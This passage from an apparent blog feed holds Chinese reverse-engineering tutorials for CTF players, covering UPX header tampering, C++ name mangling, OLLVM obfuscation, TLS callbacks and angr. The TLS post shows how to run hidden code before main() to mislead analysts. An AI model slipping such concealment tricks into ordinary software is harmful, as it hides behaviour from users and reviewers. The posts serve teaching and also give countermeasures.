src="/img/UPX%E5%A3%B3%E7%9A%84%E4%BF%AE%E6%94%B9/%E4%BF%AE%E6%94%B9%E5%85%A5%E5%8F%A3%E7%82%B93.png"></p><p>可以发现ExeinfoPE现在彻底懵逼了，但仍然能分析出是类似UPX的东西，同时upx -d失效，只能手动脱壳。<br>P.S.别问我为什么改完入口点程序还能正常运行，我也不知道。。。</p><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>嗯……奇怪的知识又增加了！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;UPX壳的修改&quot;&gt;&lt;a href=&quot;#UPX壳的修改&quot; class=&quot;headerlink&quot; title=&quot;UPX壳的修改&quot;&gt;&lt;/a&gt;UPX壳的修改&lt;/h1&gt;&lt;p&gt;咳咳，别被吓着，改UPX的源代码是万万不可能的，我要是能改那个我现在就不坐在这了。&lt;/p&gt;
&lt;h2 </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>C++函数名修饰规则</title>
    <link href="https://clovershrub.github.io/2023/02/25/C++%E5%87%BD%E6%95%B0%E5%90%8D%E4%BF%AE%E9%A5%B0%E8%A7%84%E5%88%99/"/>
    <id>https://clovershrub.github.io/2023/02/25/C++%E5%87%BD%E6%95%B0%E5%90%8D%E4%BF%AE%E9%A5%B0%E8%A7%84%E5%88%99/</id>
    <published>2023-02-24T16:00:00.000Z</published>
    <updated>2023-09-19T01:57:40.148Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C-函数名修饰规则"><a href="#C-函数名修饰规则" class="headerlink" title="C++函数名修饰规则"></a>C++函数名修饰规则</h1><h2 id="这是啥"><a href="#这是啥" class="headerlink" title="这是啥"></a>这是啥</h2><p>函数的名字修饰（Decorated Name）就是编译器在编译期间创建的一个字符串。用来指明函数的定义或原型。</p><h2 id="修饰规则"><a href="#修饰规则" class="headerlink" title="修饰规则"></a>修饰规则</h2><p>C++的修饰规则为“? + 函数名 + 标识符”</p><h3 id="标识符的第一部分"><a href="#标识符的第一部分" class="headerlink" title="标识符的第一部分"></a>标识符的第一部分</h3><p>标识符的第一部分是调用规则说明：</p><table><thead><tr><th align="center">__cdelc</th><th align="center">__fastcall</th><th align="center">__stdcall</th></tr></thead><tbody><tr><td align="center">@@YA</td><td align="center">@@YI</td><td align="center">@@YG</td></tr></tbody></table><h3 id="标识符的第二部分"><a href="#标识符的第二部分" class="headerlink" title="标识符的第二部分"></a>标识符的第二部分</h3><p>标识符的第二部分依次是返回值和函数参数的类型：</p><table><thead><tr><th align="center">int</th><th align="center">char</th><th align="center">void</th><th align="center">unsigned int</th><th align="center">unsigned char</th><th align="center">float</th><th align="center">double</th><th align="center">bool</th><th align="center">struct</th></tr></thead><tbody><tr><td align="center">H</td><td align="center">D</td><td align="center">X</td><td align="center">I</td><td align="center">E</td><td align="center">M</td><td align="center">N</td><td align="center">_N</td><td align="center">U</td></tr></tbody></table><p>其中如果类型是指针则在标识符前增加PA，如果是const类型的指针则增加PB。<br>对于结构体则在U后面添加结构体的名称，并以@@结尾。</p><h3 id="标识符的第三部分"><a href="#标识符的第三部分" class="headerlink" title="标识符的第三部分"></a>标识符的第三部分</h3><p>标识符的第三部分是结束符：<br>如果函数有参数则以“@Z”结束，否则以“Z”结束。</p><h3 id="函数名的第一部分"><a href="#函数名的第一部分" class="headerlink" title="函数名的第一部分"></a>函数名的第一部分</h3><p>函数名的第一部分是函数的本名。如果该函数不是类的成员，那么就只有第一部分。</p><h3 id="函数名的第二部分"><a href="#函数名的第二部分" class="headerlink" title="函数名的第二部分"></a>函数名的第二部分</h3><p>对于类的成员的不同属性有如下规则：</p><table><thead><tr><th align="center"></th><th align="center">public</th><th align="center">protected</th><th align="center">private</th></tr></thead><tbody><tr><td align="center">无const</td><td align="center">@@QAE</td><td align="center">@@IAE</td><td align="center">@@AAE</td></tr><tr><td align="center">有const</td><td align="center">@@QBE</td><td align="center">@@IBE</td><td align="center">@@ABE</td></tr></tbody></table><p>同时取消标识符的第一部分。<br>此时如果参数为类实例引用，则改为“AAV1”，带const改为“ABV1”。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ol><li>对于以下函数：<br><code>int Function1(char*, unsigned char); </code><br>的修饰应当为：?Function1@@YGHPADE@Z</li><li>对于以下函数：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mytype</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CTest</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">private</span>: </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Function1</span><span class="params">(<span class="type">int</span>)</span></span>; </span><br><span class="line"><span class="keyword">protected</span>: </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Function2</span><span class="params">(<span class="type">const</span> CTest &amp;amp;src)</span></span>; </span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Function3</span><span class="params">(mytype*, <span class="type">int</span>)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>其中<br>Function1的修饰应当为：<code>?Function1@CTest@@AAEXH@Z</code><br>Function2的修饰应当为：<code>?Function2@CTest@@IAEXABV1@Z</code><br>Function3的修饰应当为：<code>?Function3@CTest@@QAEXPAUmytype@@H@Z</code></li></ol><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>水了一篇，诶嘿~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;C-函数名修饰规则&quot;&gt;&lt;a href=&quot;#C-函数名修饰规则&quot; class=&quot;headerlink&quot; title=&quot;C++函数名修饰规则&quot;&gt;&lt;/a&gt;C++函数名修饰规则&lt;/h1&gt;&lt;h2 id=&quot;这是啥&quot;&gt;&lt;a href=&quot;#这是啥&quot; class=&quot;headerli</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>OLLVM代码混淆</title>
    <link href="https://clovershrub.github.io/2023/02/13/OLLVM%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/"/>
    <id>https://clovershrub.github.io/2023/02/13/OLLVM%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/</id>
    <published>2023-02-12T16:00:00.000Z</published>
    <updated>2023-09-19T02:12:46.449Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OLLVM代码混淆"><a href="#OLLVM代码混淆" class="headerlink" title="OLLVM代码混淆"></a>OLLVM代码混淆</h1><p>理论上这个时候看这个有点早，但是它的功能好nm强大啊！！！<br>原理嘛……理论部分看懂了，代码实现部分反正是没怎么看懂，但我只想玩它的功能~<br>诶嘿 ( ≧ ∇ ≦ ) &#x2F;</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="杀千刀的安装过程"><a href="#杀千刀的安装过程" class="headerlink" title="杀千刀的安装过程"></a>杀千刀的安装过程</h3><p>为什么这么说呢？因为我为了搞这个东西重装了2遍kali、3遍ubuntu，现在回过来看，我简直就是个**<br>我的kali已经没有办法安装gcc-8和g++-8了，所以使用docker<br>下载ollvm-4.0源码<br><code>git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git</code><br>下载docker<br><code>sudo apt install docker.io</code><br>加载大佬准备好的docker<br><code>sudo docker pull nickdiego/ollvm-build</code><br>下载脚本<br><code>git clone https://github.com/nickdiego/docker-ollvm</code><br>切换到docker-ollvm文件夹内<br>打开ollvm-build.sh文件，在149与150行之间加入<br><code>DOCKER_CMD+=&quot; -DLLVM_INCLUDE_TESTS=OFF&quot;</code><br>运行脚本<br><code>sudo ./ollvm-build.sh the_path_to/obfuscator</code><br>运行过程中可能会时不时报一些小错误，无视他们</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>OLLVM-4.0主要有3种好玩的功能</p><ol><li>控制流平坦化&amp;emsp;&amp;emsp;-fla</li><li>指令替换&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;-sub</li><li>虚假控制流&amp;emsp;&amp;emsp;&amp;emsp;-bcf</li></ol><p>假设要以fla模式编译文件test.c<br>以root身份打开终端或者每句前面都加sudo<br><code>mv the_path_to/test.c the_path_to/obfuscator/build_release/bin</code><br><code>cd the_path_to/obfuscator/build_release/bin</code><br><code>./clang -mllvm -fla test.c</code></p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>tnnd，四天啊！四天！你知道这四天我是怎么过来的吗？网上的教程一个编译成功的都没有啊！<br>md我就从来没见过能报这么多错的东西！网上的教程都在解决编译到90%停了怎么办，但是我tm编译到8%就停了啊！8%啊！！！<br>简历上可以多写一行：</p><blockquote><p>熟悉clang、cmake、mingw、ninja、Visual Studio、ollvm的下载与卸载</p></blockquote><h2 id="反OLLVM"><a href="#反OLLVM" class="headerlink" title="反OLLVM"></a>反OLLVM</h2><p>看<a href="https://bbs.kanxue.com/thread-272414.htm">https://bbs.kanxue.com/thread-272414.htm</a>吧<br>麻了，代码实现部分就没几行看得懂的。。。</p><h3 id="抄几个脚本"><a href="#抄几个脚本" class="headerlink" title="抄几个脚本"></a>抄几个脚本</h3><p><a href="https://files.cnblogs.com/files/blogs/775888/deOLLVM.zip?t=1680184999">脚本在此</a><br>debcf是IDApython脚本，st为起始地址，end为中止地址，if那一行写混淆的变量名。<br>defla是python脚本，使用python3 defla.py file_name start_addr命令运行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;OLLVM代码混淆&quot;&gt;&lt;a href=&quot;#OLLVM代码混淆&quot; class=&quot;headerlink&quot; title=&quot;OLLVM代码混淆&quot;&gt;&lt;/a&gt;OLLVM代码混淆&lt;/h1&gt;&lt;p&gt;理论上这个时候看这个有点早，但是它的功能好nm强大啊！！！&lt;br&gt;原理嘛……理论部分</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>TLS回调函数</title>
    <link href="https://clovershrub.github.io/2023/01/23/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/"/>
    <id>https://clovershrub.github.io/2023/01/23/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/</id>
    <published>2023-01-22T16:00:00.000Z</published>
    <updated>2023-09-19T02:12:45.667Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TLS回调函数"><a href="#TLS回调函数" class="headerlink" title="TLS回调函数"></a>TLS回调函数</h1><h2 id="TLS回调函数是个啥"><a href="#TLS回调函数是个啥" class="headerlink" title="TLS回调函数是个啥"></a>TLS回调函数是个啥</h2><p>TLS全称Thread Local Storage，中文“线程局部存储”。<br>TLS是各线程的独立的数据存储空间，使用TLS技术可在线程内部独立使用或修改进程的全局数据或静态数据，就像对待自身的局部变量一样。<br>Buuuuuuuuut，我们今天要来看一下TLS其他的用处。</p><h2 id="TLS的特性与利用"><a href="#TLS的特性与利用" class="headerlink" title="TLS的特性与利用"></a>TLS的特性与利用</h2><h3 id="TLS的基本样式"><a href="#TLS的基本样式" class="headerlink" title="TLS的基本样式"></a>TLS的基本样式</h3><p>TLS的代码实现基本样式如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)<span class="comment">//x64模式下写_tls_used</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID NTAPI <span class="title">TLS_CALLBACK</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="comment">//在这里写你想做的事情</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//它能跑，你就别管它在干啥</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line">PIMAGE_TLS_CALLBACK tlsCalls[] = &#123; TLS_CALLBACK, <span class="number">0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每一句都是什么意思呢？不知道，背下来就好了。<br>P.S.x64模式下需要禁用优化。</p><h3 id="TLS被调用的原因"><a href="#TLS被调用的原因" class="headerlink" title="TLS被调用的原因"></a>TLS被调用的原因</h3><p>TLS会因为以下4种原因被调用：<br><img src="/img/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/TLS%E8%A2%AB%E8%B0%83%E7%94%A8%E7%9A%84%E5%8E%9F%E5%9B%A01.png"><br><strong>即进程、线程的启动前和结束后。</strong><br>这种特性决定了它经常被用于反调试，你的程序会在main()函数之前就被莫名其妙地中止了。</p><h3 id="测试你的TLS回调函数"><a href="#测试你的TLS回调函数" class="headerlink" title="测试你的TLS回调函数"></a>测试你的TLS回调函数</h3><p>运行下面的代码，看看你的输出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID NTAPI <span class="title">TLS_CALLBACK</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (Reason == DLL_PROCESS_ATTACH)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;running TLSCallBack before main()\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Reason == DLL_PROCESS_DETACH)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;running TLSCallBack after main()\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Reason == DLL_THREAD_ATTACH)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;running TLSCallBack before thread\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Reason == DLL_THREAD_DETACH)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;running TLSCallBack after thread\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line">PIMAGE_TLS_CALLBACK tlsCalls[] = &#123; TLS_CALLBACK, <span class="number">0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">my_thread</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;thread begin\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;thread end\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;main() begin\n&quot;</span>);</span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)my_thread, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">1000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;main() end\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理论上应该会输出4遍running TLSCallBack balabala。然鹅，我这里只能输出成这样：<br><img src="/img/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/%E6%B5%8B%E8%AF%95%E4%BD%A0%E7%9A%84TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B01.png"></p><h3 id="利用TLS藏东西"><a href="#利用TLS藏东西" class="headerlink" title="利用TLS藏东西"></a>利用TLS藏东西</h3><p>我们在写代码的时候总有一些事情是不想让别人发现的，比如srand()之类的，或者把真正的加密函数藏起来。我们就可以把它放在TLS中运行。如果你的TLS是可以在main()之后运行的。那么你可以藏成这样：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID NTAPI <span class="title">TLS_CALLBACK0</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (Reason == DLL_PROCESS_ATTACH)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//first half of encryption code</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Reason == DLL_PROCESS_DETACH)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//last half of encryption code</span></span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID NTAPI <span class="title">TLS_CALLBACK1</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//change something that will be used in the last half of encryption code</span></span><br><span class="line"><span class="built_in">ExitProcess</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line">PIMAGE_TLS_CALLBACK tlsCalls[] = &#123; TLS_CALLBACK0, TLS_CALLBACK1, <span class="number">0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//fake encryption code</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样程序在执行完TLS_CALLBACK1后会因为ExitProcess(-1)而结束进程，即跳过整个main()函数去执行TLS_CALLBACK0。<br>如果你像我一样，main()函数后面无法运行TLS，那么你可以藏成这样：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID NTAPI <span class="title">TLS_CALLBACK0</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (Reason == DLL_PROCESS_ATTACH)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//first half of encryption code</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID NTAPI <span class="title">TLS_CALLBACK1</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (Reason == DLL_THREAD_ATTACH)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//last half of encryption code</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line">PIMAGE_TLS_CALLBACK tlsCalls[] = &#123; TLS_CALLBACK0, TLS_CALLBACK1, <span class="number">0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">my_thread</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//fake encryption code</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)my_thread, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);<span class="comment">//这样此句之后的东西就不会被执行了</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于exit(0)的存在，整个函数不会执行线程中的任何一行代码。</p><h3 id="邪恶的想法"><a href="#邪恶的想法" class="headerlink" title="邪恶的想法"></a>邪恶的想法</h3><p>上述写法已经可以让我们神不知鬼不觉地绕过展示出来的代码而去执行藏起来的东西。如果再在真正的加密函数中用上Windows系统编程特有的try-except模块，那么你将创造出一个IDA里处处都是假代码的、丧心病狂的、恶心至极的题目。hiahiahiahia……</p><h2 id="TLS的防治"><a href="#TLS的防治" class="headerlink" title="TLS的防治"></a>TLS的防治</h2><h3 id="识别TLS的存在"><a href="#识别TLS的存在" class="headerlink" title="识别TLS的存在"></a>识别TLS的存在</h3><p>我们可以在main()函数的第一行代码&#x2F;创建线程的代码处下个断点，然后动调，发现程序退出了&#x2F;输出了或者进行操作了都是TLS存在的特征。</p><h3 id="解决TLS的问题"><a href="#解决TLS的问题" class="headerlink" title="解决TLS的问题"></a>解决TLS的问题</h3><p>想多了，我不会。不过好消息是IDA会。<br>在IDA的函数窗口搜索TLS就会显示出IDA帮你分析出来的TLS回调函数：<br><img src="/img/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/%E8%A7%A3%E5%86%B3TLS%E7%9A%84%E9%97%AE%E9%A2%981.png"><br>然后我们就可以去里面慢慢读了。</p><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>怎么做恶心的题不太会，但怎么出恶心的题倒是会了……<br>阿巴阿巴阿巴……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TLS回调函数&quot;&gt;&lt;a href=&quot;#TLS回调函数&quot; class=&quot;headerlink&quot; title=&quot;TLS回调函数&quot;&gt;&lt;/a&gt;TLS回调函数&lt;/h1&gt;&lt;h2 id=&quot;TLS回调函数是个啥&quot;&gt;&lt;a href=&quot;#TLS回调函数是个啥&quot; class=&quot;head</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Angr符号执行</title>
    <link href="https://clovershrub.github.io/2023/01/21/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    <id>https://clovershrub.github.io/2023/01/21/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/</id>
    <published>2023-01-20T16:00:00.000Z</published>
    <updated>2023-09-19T01:53:46.763Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Angr符号执行"><a href="#Angr符号执行" class="headerlink" title="Angr符号执行"></a>Angr符号执行</h1><p>首先引用名言：</p><blockquote><p>我超，这angr好几把神奇。        ——iPlayForSG</p></blockquote><h2 id="angr的安装"><a href="#angr的安装" class="headerlink" title="angr的安装"></a>angr的安装</h2><p>我在kali上用(<a href="https://eps1l0h.github.io/2022/11/04/angr%E5%88%9D%E6%8E%A2/">EPsilon学长&#x2F;姐</a>)&#x2F;<a href="https://www.cnblogs.com/Here-is-SG/p/15815136.html">iPlayForSG学长</a>的方法没成功，最后用的<a href="https://www.cnblogs.com/level5uiharu/p/16925853.html">这个</a></p><h2 id="angr-find"><a href="#angr-find" class="headerlink" title="angr_find"></a>angr_find</h2><p>这一关让我们来熟悉angr的用法<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_find1.png"><br>写出脚本:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(&#x27;./00_angr_find&#x27;)      #创建项目</span><br><span class="line">init_state = p.factory.entry_state()    #设置入口点</span><br><span class="line">s = p.factory.simgr(init_state)         #创建模拟器</span><br><span class="line"></span><br><span class="line">s.explore(find = 0x08048678)            #设置条件</span><br><span class="line"></span><br><span class="line">if 